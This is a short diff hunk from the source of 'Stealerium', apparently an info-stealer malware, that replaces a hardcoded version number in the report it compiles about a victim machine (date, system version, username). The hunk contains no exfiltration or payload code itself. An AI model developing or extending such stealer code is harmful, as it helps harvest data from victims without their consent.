@@ -288,7 +288,7 @@ namespace Stealerium
 
             // Get system info as a report string
             var info = "```"
-                       + "\n😹 *Stealerium v3.1.0 - Report:*"
+                       + "\n😹 *Stealerium " + Config.Version + "- Report:*"
                        + "\nDate: " + SystemInfo.Datenow
                        + "\nSystem: " + SystemInfo.GetSystemVersion()
                        + "\nUsername: " + SystemInfo.Username
